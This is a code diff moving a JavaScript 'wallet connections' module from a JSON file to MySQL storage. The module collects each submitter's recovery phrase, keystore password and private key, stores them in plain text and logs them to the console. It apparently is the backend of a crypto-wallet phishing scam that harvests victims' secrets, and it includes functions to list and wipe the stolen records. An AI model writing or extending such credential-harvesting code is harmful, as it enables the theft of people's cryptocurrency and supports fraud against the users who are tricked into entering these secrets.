@@ -1,74 +1,155 @@
-import fs from 'fs';
-import path from 'path';
+import { executeQuery, initializeDatabase } from './mysqlConnection.js';
 
-const dataFilePath = path.join(process.cwd(), 'app', 'data', 'walletConnections.json');
+// Try to initialize MySQL database
+let useMySQL = false;
+let mysqlInitialized = false;
 
-// Ensure data directory exists
-const dataDir = path.dirname(dataFilePath);
-if (!fs.existsSync(dataDir)) {
-  fs.mkdirSync(dataDir, { recursive: true });
-}
-
-// Initialize empty array if file doesn't exist
-if (!fs.existsSync(dataFilePath)) {
-  fs.writeFileSync(dataFilePath, JSON.stringify([], null, 2));
-}
-
-// Read all wallet connections
-export function readWalletConnections() {
+// Initialize MySQL synchronously and wait for completion
+async function initializeMySQL() {
   try {
-    const data = fs.readFileSync(dataFilePath, 'utf8');
-    return JSON.parse(data);
+    const success = await initializeDatabase();
+    useMySQL = success;
+    mysqlInitialized = true;
+    console.log(`Using MySQL for data storage`);
   } catch (error) {
-    console.error('Error reading wallet connections:', error);
-    return [];
+    console.error('MySQL connection failed:', error.message);
+    mysqlInitialized = true;
+    throw new Error('MySQL database connection failed');
   }
 }
 
-// Write wallet connections to file
-export function writeWalletConnections(connections) {
+// Wait for MySQL initialization before processing any requests
+export async function waitForMySQLInitialization() {
+  if (!mysqlInitialized) {
+    console.log('Waiting for MySQL initialization...');
+    // Wait for initialization to complete
+    await new Promise(resolve => {
+      const checkInitialization = () => {
+        if (mysqlInitialized) {
+          resolve();
+        } else {
+          setTimeout(checkInitialization, 100);
+        }
+      };
+      checkInitialization();
+    });
+  }
+  if (!useMySQL) {
+    throw new Error('MySQL database is not available');
+  }
+  return useMySQL;
+}
+
+// Start MySQL initialization
+initializeMySQL();
+
+// Read all wallet connections
+export async function readWalletConnections() {
+  await waitForMySQLInitialization();
+  
   try {
-    fs.writeFileSync(dataFilePath, JSON.stringify(connections, null, 2));
-    return true;
+    const query = 'SELECT * FROM wallet_connections ORDER BY timestamp ASC';
+    const connections = await executeQuery(query);
+    return connections;
   } catch (error) {
-    console.error('Error writing wallet connections:', error);
-    return false;
+    console.error('Error reading from MySQL:', error.message);
+    throw error;
   }
 }
 
 // Add a new wallet connection
-export function addWalletConnection(connectionData) {
-  const connections = readWalletConnections();
-  const newConnection = {
-    id: Date.now().toString(),
-    timestamp: new Date().toISOString(),
-    ...connectionData,
-    status: 'submitted'
-  };
+export async function addWalletConnection(connectionData) {
+  await waitForMySQLInitialization();
   
-  connections.push(newConnection);
-  
-  if (writeWalletConnections(connections)) {
-    return newConnection;
+  try {
+    const {
+      walletName,
+      connectionMethod,
+      phraseInput = null,
+      keystorePassword = null,
+      privateKeyInput = null
+    } = connectionData;
+
+    const id = Date.now().toString();
+    const timestamp = new Date().toISOString();
+    const status = 'submitted';
+
+    const query = `
+      INSERT INTO wallet_connections 
+      (id, timestamp, walletName, connectionMethod, status, phraseInput, keystorePassword, privateKeyInput)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    `;
+
+    const params = [
+      id,
+      timestamp,
+      walletName,
+      connectionMethod,
+      status,
+      phraseInput,
+      keystorePassword,
+      privateKeyInput
+    ];
+
+    console.log('Executing query:', query, 'with params:', params);
+    const result = await executeQuery(query, params);
+    console.log('Insert result:', result);
+
+    // Return the newly created connection
+    return {
+      id,
+      timestamp,
+      walletName,
+      connectionMethod,
+      status,
+      phraseInput,
+      keystorePassword,
+      privateKeyInput
+    };
+  } catch (error) {
+    console.error('Error adding to MySQL:', error.message);
+    throw error;
   }
-  return null;
 }
 
 // Get all wallet connections sorted by timestamp (ascending)
-export function getWalletConnectionsSorted() {
-  const connections = readWalletConnections();
-  return connections.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+export async function getWalletConnectionsSorted() {
+  await waitForMySQLInitialization();
+  
+  try {
+    const query = 'SELECT * FROM wallet_connections ORDER BY timestamp ASC';
+    const connections = await executeQuery(query);
+    return connections;
+  } catch (error) {
+    console.error('Error getting sorted from MySQL:', error.message);
+    throw error;
+  }
 }
 
 // Get wallet connections by wallet name
-export function getWalletConnectionsByWallet(walletName) {
-  const connections = readWalletConnections();
-  return connections
-    .filter(conn => conn.walletName === walletName)
-    .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+export async function getWalletConnectionsByWallet(walletName) {
+  await waitForMySQLInitialization();
+  
+  try {
+    const query = 'SELECT * FROM wallet_connections WHERE walletName = ? ORDER BY timestamp ASC';
+    const connections = await executeQuery(query, [walletName]);
+    return connections;
+  } catch (error) {
+    console.error('Error getting by wallet from MySQL:', error.message);
+    throw error;
+  }
 }
 
 // Clear all wallet connections (for testing/reset)
-export function clearWalletConnections() {
-  return writeWalletConnections([]);
+export async function clearWalletConnections() {
+  await waitForMySQLInitialization();
+  
+  try {
+    const query = 'DELETE FROM wallet_connections';
+    await executeQuery(query);
+    return true;
+  } catch (error) {
+    console.error('Error clearing MySQL:', error.message);
+    throw error;
+  }
 }
